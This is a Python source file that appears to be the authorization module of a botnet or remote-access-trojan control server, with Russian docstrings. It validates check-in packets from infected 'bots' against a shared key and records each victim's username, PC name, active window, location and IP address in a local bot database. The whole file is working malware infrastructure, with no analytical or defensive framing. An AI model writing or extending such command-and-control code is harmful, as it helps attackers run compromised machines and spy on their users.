# backend/Services/Auth.py
import asyncio, json, logs.LoggerWrapper as logger, backend as cfg
from pathlib import Path

BOTS_FILE, REQUIRED = Path(__file__).parent / "Bots_DB.txt", ['id', 'loc', 'user', 'pc_name', 'active_window', 'last_active', 'ip', 'auth_key']

async def authorize_client(reader, ip_address):
    "Валидация пакета авторизации и синхронизация с БД"
    try:
        if not (0 < (p_len := int.from_bytes(await asyncio.wait_for(reader.readexactly(4), 10), "big")) <= 65536): return None
        data = json.loads((await asyncio.wait_for(reader.readexactly(p_len), 10)).decode())
        if any(f not in data for f in REQUIRED) or data.get('auth_key') != cfg.AUTH_KEY: return None
        if data.get('ip') == "0.0.0.0": data['ip'] = ip_address
        return (bid := data.get('id')), sync_bot_data(bid, data)
    except Exception as error: logger.Log.info(f"[!] Auth Error {ip_address}: {error}")

def sync_bot_data(bot_id, payload):
    "Обновление локальной БД ботов с фильтрацией пустых значений"
    try:
        db = json.loads(BOTS_FILE.read_text(encoding="utf-8")) if BOTS_FILE.exists() else {}
        clean = {k: v for k, v in payload.items() if k != 'auth_key'}
        if bot_id not in db: db[bot_id] = clean
        else:
            for k, v in clean.items():
                if db[bot_id].get(k) in [None, "", "??", "0.0.0.0", "Loading...", "Idle"] or v not in [None, "??", "0.0.0.0"]: db[bot_id][k] = v
        BOTS_FILE.write_text(json.dumps(db, ensure_ascii=False), encoding="utf-8")
        return db[bot_id]
    except Exception as error: logger.Log.error(f"DB Sync Error: {error}"); return payload